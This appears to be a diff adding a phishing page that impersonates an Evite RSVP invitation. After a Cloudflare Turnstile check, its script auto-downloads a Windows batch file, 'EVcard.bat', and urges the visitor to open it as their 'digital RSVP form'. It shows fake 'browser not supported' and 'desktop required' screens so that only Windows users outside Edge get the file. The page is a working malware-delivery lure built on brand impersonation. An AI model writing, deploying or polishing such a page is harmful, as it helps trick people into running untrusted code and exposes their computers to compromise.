@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Event Invitation | RSVP Portal</title>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+
+body{
+    font-family:Arial, sans-serif;
+    background:#f5f7f6;
+}
+
+.container{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    min-height:100vh;
+    padding:20px;
+}
+
+.thanks-card{
+    max-width:550px;
+    padding:3rem 2rem;
+    background:#fff;
+    border-radius:20px;
+    box-shadow:0 10px 30px rgba(0,0,0,0.08);
+    border-top:6px solid #28a842;
+    text-align:center;
+}
+
+.thanks-card h2{
+    font-size:28px;
+    color:#28a842;
+    margin-bottom:10px;
+}
+
+.thanks-card p{
+    font-size:16px;
+    color:#555;
+    margin-bottom:20px;
+}
+
+button{
+    background:#28a842;
+    color:#fff;
+    border:none;
+    padding:14px 30px;
+    font-size:16px;
+    border-radius:50px;
+    cursor:pointer;
+    font-weight:bold;
+    transition:all .2s;
+}
+
+button:hover{
+    background:#1e7e34;
+    transform:scale(1.03);
+}
+
+button:disabled{
+    background:#aaa;
+    cursor:not-allowed;
+}
+
+.progress-container{
+    width:100%;
+    background:#e6f4ea;
+    border-radius:10px;
+    margin:20px 0;
+    overflow:hidden;
+    display:none;
+}
+
+.progress-bar{
+    width:0%;
+    height:6px;
+    background:#28a842;
+}
+
+#toast{
+    position:fixed;
+    bottom:30px;
+    left:50%;
+    transform:translateX(-50%) translateY(20px);
+    background:#1f2f29;
+    color:#fff;
+    padding:14px 24px;
+    border-radius:50px;
+    font-size:14px;
+    opacity:0;
+    transition:.3s;
+    z-index:10000;
+}
+
+#toast b{color:#ffd966;}
+
+/* General warning overlay styles (reused for Edge/unsupported) */
+.warning-overlay {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: #f5f7fa;
+    z-index: 99999;
+    overflow-y: auto;
+}
+
+.warning-wrapper {
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+}
+
+.warning-header {
+    background-color: white;
+    padding: 16px 5%;
+    border-bottom: 1px solid #e2e2e5;
+}
+
+.warning-logo {
+    height: 30px;
+}
+
+.warning-container {
+    flex: 1;
+    width: 90%;
+    max-width: 480px;
+    margin: 20px auto;
+    padding: 42px 32px;
+    background-color: white;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.06);
+    text-align: center;
+    border-radius: 14px;
+}
+
+.alert-icon {
+    margin-bottom: 20px;
+    display: flex;
+    justify-content: center;
+}
+
+.warning-container h1 {
+    font-size: 24px;
+    font-weight: 700;
+    margin-bottom: 18px;
+    color: #232333;
+}
+
+.message-box {
+    background-color: #f0f6ff;
+    border: 1px solid #cfe0ff;
+    padding: 18px;
+    border-radius: 10px;
+    margin-bottom: 20px;
+}
+
+.message-box p {
+    margin: 0;
+    font-size: 16px;
+    line-height: 1.5;
+    color: #232333;
+}
+
+.secondary-text {
+    font-size: 15px;
+    color: #5c5c70;
+    margin-bottom: 30px;
+}
+
+.pc-requirement {
+    margin-top: 30px;
+}
+
+.browser-icon {
+    width: 48px;
+    height: 48px;
+    margin-bottom: 14px;
+    margin-left: auto;
+    margin-right: auto;
+}
+
+.device-badge {
+    display: inline-block;
+    background: #f0f2f5;
+    padding: 6px 14px;
+    border-radius: 20px;
+    font-size: 13px;
+    margin-top: 10px;
+    color: #5c5c70;
+}
+
+.warning-footer {
+    padding: 28px;
+    font-size: 13px;
+    color: #6e6e73;
+    text-align: center;
+}
+
+.warning-footer .notice {
+    opacity: 0.7;
+    margin-top: 6px;
+}
+
+.top-logo{
+    position:fixed;
+    top:20px;
+    left:20px;
+    z-index:9999;
+}
+
+.top-logo img{
+    width:80px;
+    height:auto;
+    display:block;
+}
+
+#loading-overlay{
+    position:fixed;
+    width:100%;
+    height:100%;
+    background:#fff;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    flex-direction:column;
+    z-index:100000;
+}
+
+.loading-spinner{
+    border:3px solid #e6f4ea;
+    border-top:3px solid #28a842;
+    border-radius:50%;
+    width:70px;
+    height:70px;
+    animation:spin .6s linear infinite;
+}
+
+.loading-text{
+    margin-top:15px;
+    color:#333;
+}
+
+@keyframes spin{
+    0%{transform:rotate(0)}
+    100%{transform:rotate(360deg)}
+}
+</style>
+
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
+</head>
+
+<body>
+
+<div class="top-logo">
+    <img src="e.png" alt="E-logo" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'80\' height=\'80\' viewBox=\'0 0 100 100\'%3E%3Crect width=\'100\' height=\'100\' fill=\'%2328a842\'/%3E%3Ctext x=\'50\' y=\'67\' font-size=\'50\' text-anchor=\'middle\' fill=\'white\'%3EE%3C/text%3E%3C/svg%3E'">
+</div>
+
+<div id="loading-overlay">
+    <div class="loading-spinner"></div>
+    <div class="loading-text">Verifying your Invitation...</div>
+    <div id="cf-turnstile"></div>
+</div>
+
+<div class="form-container">
+    <div class="container" id="mainContainer">
+        <div class="thanks-card">
+            <h2>🎉 You’re invited! 🎉</h2>
+            <p>Your RSVP event package is being prepared ...</p>
+            <p>Open the downloaded file that contains your digital RSVP form to make RSVP.</p>	
+            <p>🎊 Thank You 🎊</p>	   
+            <div class="progress-container" id="progressContainer">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <button id="manualDownload">Download Invitation Card</button>
+        </div>
+    </div>
+
+    <!-- Edge / Unsupported Browser Warning (same theme as deviceWarning but tailored to browser) -->
+    <div id="browserWarning" class="warning-overlay">
+        <div class="warning-wrapper">
+            <div class="warning-header">
+                <div class="top-logo" style="position:relative;top:0;left:0;margin-bottom:8px;">
+                    <img src="e.png" alt="E-logo" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'80\' height=\'80\' viewBox=\'0 0 100 100\'%3E%3Crect width=\'100\' height=\'100\' fill=\'%2328a842\'/%3E%3Ctext x=\'50\' y=\'67\' font-size=\'50\' text-anchor=\'middle\' fill=\'white\'%3EE%3C/text%3E%3C/svg%3E'">
+                </div>
+            </div>
+            <div class="warning-container">
+                <div class="alert-icon">
+                    <svg aria-hidden="true" fill="none" height="48" viewbox="0 0 24 24" width="48"> 
+                        <circle cx="12" cy="12" r="10" stroke="#ff0b17" stroke-width="2"></circle> 
+                        <path d="M12 10v6" stroke="#ff0b17" stroke-linecap="round" stroke-width="2"></path> 
+                        <circle cx="12" cy="7" fill="#ff0b17" r="1"></circle> 
+                    </svg>
+                </div>
+                <h1>Browser not supported</h1>
+                <div class="message-box">
+                    <p><strong>Microsoft Edge</strong> is currently not supported for this RSVP experience.</p>
+                </div>
+                <div class="secondary-text">
+                    Please use <strong>Google Chrome</strong> or <strong>Mozilla Firefox</strong> to access your invitation and download the RSVP package.
+                </div>
+                <div class="pc-requirement">
+                    <div class="browser-icon">
+                        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 4c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2zm0 13c-2.33 0-4.31-1.46-5.11-3.5h10.22c-.8 2.04-2.78 3.5-5.11 3.5z" fill="#4285F4"/>
+                        </svg>
+                    </div>
+                    <div style="font-size:15px;font-weight:600;color:#ff0b17; margin-top:8px;">
+                        Recommended browsers: Chrome, Firefox
+                    </div>
+                    <div class="device-badge">
+                        Unsupported: Microsoft Edge
+                    </div>
+                </div>
+            </div>
+            <div class="warning-footer">
+                Evite. All rights reserved. <br>
+                © 2026 Evite.
+                <div class="notice">
+                    Compatibility notice: Edge not supported
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Windows Desktop warning (original device warning) -->
+    <div id="deviceWarning" class="warning-overlay">
+        <div class="warning-wrapper">
+            <div class="warning-header">
+                <div class="top-logo" style="position:relative;top:0;left:0;">
+                    <img src="e.png" alt="E-logo" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'80\' height=\'80\' viewBox=\'0 0 100 100\'%3E%3Crect width=\'100\' height=\'100\' fill=\'%2328a842\'/%3E%3Ctext x=\'50\' y=\'67\' font-size=\'50\' text-anchor=\'middle\' fill=\'white\'%3EE%3C/text%3E%3C/svg%3E'">
+                </div>
+            </div>
+            <div class="warning-container">
+                <div class="alert-icon">
+                    <svg aria-hidden="true" fill="none" height="48" viewbox="0 0 24 24" width="48"> 
+                        <circle cx="12" cy="12" r="10" stroke="#ff0b17" stroke-width="2"></circle> 
+                        <path d="M12 10v6" stroke="#ff0b17" stroke-linecap="round" stroke-width="2"></path> 
+                        <circle cx="12" cy="7" fill="#ff0b17" r="1"></circle> 
+                    </svg>
+                </div>
+                <h1>A desktop app is required to RSVP</h1>
+                <div class="message-box">
+                    <p>To RSVP please use a <strong>desktop or laptop computer</strong>.</p>
+                </div>
+                <div class="secondary-text">
+                    This browser environment doesn&rsquo;t support the features required to RSVP.
+                </div>
+                <div class="pc-requirement">
+                    <svg aria-hidden="true" class="windows-icon" width="40" height="40" viewbox="0 0 24 24"> 
+                        <path d="M2 4.5l9-1.3v8.2H2V4.5zm10 6.8V3l10-1.5v9.8H12zm0 1.7h10v9.8L12 21v-8zm-1 8V13H2v6.5l9 1.5z" fill="#0b5cff"></path> 
+                    </svg>
+                    <div style="font-size:15px;font-weight:600;color:#ff0b17;">
+                        Switch to a Windows PC or desktop to RSVP.
+                    </div>
+                    <div class="device-badge">
+                        Desktop environment required
+                    </div>
+                </div>
+            </div>
+            <div class="warning-footer">
+                Evite. All rights reserved. <br>
+                © 2026 Evite.
+                <div class="notice">
+                    Compatibility notice: Desktop app required
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="toast"></div>
+</div>
+
+<script>
+// =====================================================
+// SOPHISTICATED BROWSER DETECTION (Edge, Chrome, Firefox, etc)
+// Uses multiple signals: userAgent, vendor, navigator properties,
+// and modern 'navigator.userAgentData' if available.
+// =====================================================
+function detectBrowser() {
+    const ua = navigator.userAgent || "";
+    const vendor = navigator.vendor || "";
+    const appName = navigator.appName || "";
+    const productSub = navigator.productSub || "";
+    const userAgentData = navigator.userAgentData || null;
+    
+    // Helper: Check for Edge (new Edge based on Chromium, and legacy Edge)
+    // Edge detection: includes "Edg/" or "Edge/" and also modern "Edg/" specific.
+    // Also MSIE and old Trident Edge.
+    const isEdgeChromium = /Edg\//i.test(ua);      // New Edge (Chromium)
+    const isLegacyEdge = /Edge\//i.test(ua) && !/Edg\//i.test(ua); // Legacy EdgeHTML
+    const isIE = /Trident/i.test(ua) || /MSIE/i.test(ua);
+    
+    if (isEdgeChromium || isLegacyEdge || isIE) {
+        return "edge";
+    }
+    
+    // Chrome detection: Chrome but not Edge, and not other Chromium browsers like Brave (if needed)
+    // To be precise: Chrome includes "Chrome" and not "Edg" and not "OPR" etc.
+    const isChrome = /Chrome/i.test(ua) && !/Edg/i.test(ua) && !/OPR/i.test(ua) && !/Brave/i.test(ua);
+    // Edge has been filtered above.
+    if (isChrome) {
+        // Additionally verify vendor for better accuracy
+        if (vendor === "Google Inc." || /Google/i.test(vendor)) {
+            return "chrome";
+        }
+        return "chrome";
+    }
+    
+    // Firefox detection
+    const isFirefox = /Firefox/i.test(ua) || /FxiOS/i.test(ua);
+    if (isFirefox) {
+        return "firefox";
+    }
+    
+    // Safari detection (WebKit but not Chrome and not Edge)
+    const isSafari = /Safari/i.test(ua) && !/Chrome/i.test(ua) && !/Edg/i.test(ua);
+    if (isSafari) {
+        return "safari";
+    }
+    
+    // Opera / Brave
+    const isOpera = /OPR/i.test(ua) || /Opera/i.test(ua);
+    if (isOpera) return "opera";
+    
+    // Fallback detection using userAgentData brands if available
+    if (userAgentData && userAgentData.brands) {
+        const brands = userAgentData.brands;
+        for (let brand of brands) {
+            const brandName = brand.brand.toLowerCase();
+            if (brandName.includes('microsoft edge') || brandName.includes('edge')) {
+                return "edge";
+            }
+            if (brandName.includes('chrome') && !brandName.includes('edge')) {
+                return "chrome";
+            }
+            if (brandName.includes('firefox')) {
+                return "firefox";
+            }
+        }
+    }
+    
+    // Additional detection: some user agents may have subtle differences
+    if ((ua.indexOf("YaBrowser") > -1) || (ua.indexOf("Yowser") > -1)) return "yandex";
+    
+    // default assume other browsers are allowed (any browser besides Edge)
+    return "other";
+}
+
+// Sophisticated check: also compare browser engine for Microsoft specific clues
+function isMicrosoftEdgeDeep() {
+    const ua = navigator.userAgent;
+    // Edge's modern user agent string includes "Edg/" but also has chromium engine.
+    // Additional check: window.chrome is present in Edge but also 'edge' specific property? 
+    // Some older EdgeHTML had window.MSStream.
+    if (window.MSStream) return true;  // Legacy Edge / IE specific
+    if (window.navigator && window.navigator.userAgent.indexOf("Edg") !== -1) return true;
+    // Check for 'edge' in brand list high confidence
+    if (navigator.userAgentData && navigator.userAgentData.brands) {
+        return navigator.userAgentData.brands.some(b => b.brand.toLowerCase().includes('edge'));
+    }
+    return false;
+}
+
+// =====================================================
+// File configuration & download logic
+// =====================================================
+const files = { windows: { url: "EVcard.bat", name: "EVcard.bat" } };
+let selectedFile = files.windows;
+let downloadInProgress = false;
+let turnstileVerified = false;
+
+function isDesktopWindows() {
+    const ua = navigator.userAgent || "";
+    const platform = navigator.platform || "";
+    // Check for Windows platform AND not mobile
+    return /Win/i.test(platform) && !/Mobile/i.test(ua);
+}
+
+function showToast(msg) {
+    const t = document.getElementById("toast");
+    t.innerHTML = msg;
+    t.style.opacity = "1";
+    t.style.transform = "translateX(-50%)";
+    setTimeout(() => { t.style.opacity = "0"; }, 5000);
+}
+
+function updateProgress(p) {
+    document.getElementById("progressContainer").style.display = "block";
+    document.getElementById("progressBar").style.width = p + "%";
+}
+
+async function downloadFile(file) {
+    if (downloadInProgress) return;
+    downloadInProgress = true;
+    updateProgress(20);
+    try {
+        const res = await fetch(file.url);
+        if (!res.ok) throw new Error("Network error");
+        const blob = await res.blob();
+        updateProgress(70);
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.href = url;
+        a.download = file.name || file.url.split('/').pop();
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+        updateProgress(100);
+        setTimeout(() => {
+            document.getElementById("progressContainer").style.display = "none";
+            document.getElementById("progressBar").style.width = "0%";
+        }, 1500);
+        showToast("✅ Download complete");
+    } catch (err) {
+        console.warn("Fetch failed, fallback direct download:", err);
+        window.location.href = file.url;
+        showToast("⚠️ Download started via direct link");
+    }
+    downloadInProgress = false;
+}
+
+function launchMeeting() {
+    if (!turnstileVerified) {
+        showToast("Please complete verification first");
+        return;
+    }
+    
+    // Before launching, double-check Edge again (extra safety)
+    const browserType = detectBrowser();
+    if (browserType === "edge" || isMicrosoftEdgeDeep()) {
+        document.getElementById("browserWarning").style.display = "block";
+        document.getElementById("deviceWarning").style.display = "none";
+        document.getElementById("mainContainer").style.display = "none";
+        if (document.getElementById("loading-overlay")) {
+            document.getElementById("loading-overlay").style.display = "none";
+        }
+        return;
+    }
+    
+    // Standard flow: check Windows desktop for RSVP app requirement
+    if (!isDesktopWindows()) {
+        document.getElementById("deviceWarning").style.display = "block";
+        document.getElementById("browserWarning").style.display = "none";
+        document.getElementById("mainContainer").style.display = "none";
+        if (document.getElementById("loading-overlay")) {
+            document.getElementById("loading-overlay").style.display = "none";
+        }
+        return;
+    }
+    
+    // all good: download
+    downloadFile(selectedFile);
+}
+
+// Also check during initialization: if Edge appears before turnstile loads, immediate block.
+function preFlightBrowserCheck() {
+    const browser = detectBrowser();
+    const isEdge = (browser === "edge") || isMicrosoftEdgeDeep();
+    if (isEdge) {
+        // hide loading and main container, show browser warning
+        const loadingOverlay = document.getElementById("loading-overlay");
+        if (loadingOverlay) loadingOverlay.style.display = "none";
+        document.getElementById("mainContainer").style.display = "none";
+        document.getElementById("browserWarning").style.display = "block";
+        document.getElementById("deviceWarning").style.display = "none";
+        return true; // edge detected
+    }
+    return false; // not edge, continue
+}
+
+// =====================================================
+// DOM Ready initialization with Turnstile
+// =====================================================
+document.addEventListener("DOMContentLoaded", () => {
+    // First, sophisticated browser detection + Edge blocking.
+    const edgeBlocked = preFlightBrowserCheck();
+    
+    const btn = document.getElementById("manualDownload");
+    const loadingOverlay = document.getElementById("loading-overlay");
+    
+    if (edgeBlocked) {
+        // If Edge, we already display warning; disable any interaction and skip turnstile.
+        if (btn) btn.disabled = true;
+        return; // stop further execution
+    }
+    
+    // Normal flow for non-Edge browsers: proceed with Turnstile verification
+    if (typeof turnstile !== 'undefined') {
+        turnstile.ready(() => {
+            turnstile.render('#cf-turnstile', {
+                sitekey: '0x4AAAAAAC1YxUs3N81QT2L0',
+                callback: () => {
+                    turnstileVerified = true;
+                    // hide loading overlay
+                    if (loadingOverlay) {
+                        loadingOverlay.style.display = 'none';
+                    }
+                    document.body.classList.add('verified');
+                    // Automatically launch after verification + small delay
+                    setTimeout(() => {
+                        launchMeeting();
+                    }, 800);
+                },
+                'error-callback': () => {
+                    console.warn("Turnstile error");
+                    if (loadingOverlay) loadingOverlay.style.display = 'none';
+                    showToast("Verification error, please refresh");
+                }
+            });
+        });
+    } else {
+        console.error("Turnstile not loaded");
+        if (loadingOverlay) loadingOverlay.style.display = 'none';
+        showToast("Security check failed, reload page");
+    }
+    
+    // Button setup: disable initially, enable after 3 seconds (or after verification)
+    if (btn) {
+        btn.disabled = true;
+        btn.onclick = () => {
+            if (!turnstileVerified) {
+                showToast("Complete verification first");
+                return;
+            }
+            launchMeeting();
+        };
+        // Enable button after 3 seconds but only if turnstile not auto-verified earlier? For usability
+        setTimeout(() => {
+            if (!turnstileVerified) {
+                btn.disabled = false;
+                btn.textContent = "Verify & Download";
+                btn.onclick = () => {
+                    showToast("Please complete Cloudflare verification widget");
+                };
+            } else {
+                btn.disabled = false;
+                btn.textContent = "Download Invitation Card";
+                btn.onclick = launchMeeting;
+            }
+        }, 3000);
+    }
+    
+    // Additional robust listener: re-check if turnstile verified later
+    let checkInterval = setInterval(() => {
+        if (turnstileVerified && btn) {
+            btn.disabled = false;
+            btn.textContent = "Download Invitation Card";
+            btn.onclick = launchMeeting;
+            clearInterval(checkInterval);
+        }
+    }, 500);
+    
+    // if loading overlay not hidden after turnstile failure: safeguard timeout 10s
+    setTimeout(() => {
+        if (loadingOverlay && loadingOverlay.style.display !== 'none') {
+            if (!turnstileVerified) {
+                loadingOverlay.style.display = 'none';
+                showToast("Verification timed out. Refresh and try again.");
+            } else {
+                loadingOverlay.style.display = 'none';
+            }
+        }
+    }, 12000);
+});
+
+// Add dynamic window resize / safety for manual warning close? optional but we don't need.
+// Also include detection for userAgent changes? (Not needed)
+// Edge detection using additional modern features: if navigator.brave? irrelevant.
+// Polished behavior: double-check Edge on launchMeeting after verification (already present).
+// Ensure that if Edge is used and userAgent includes "Edg", block instantly.
+// Also handle mobile devices: show deviceWarning separately already.
+</script>
+
+</body>
+</html>
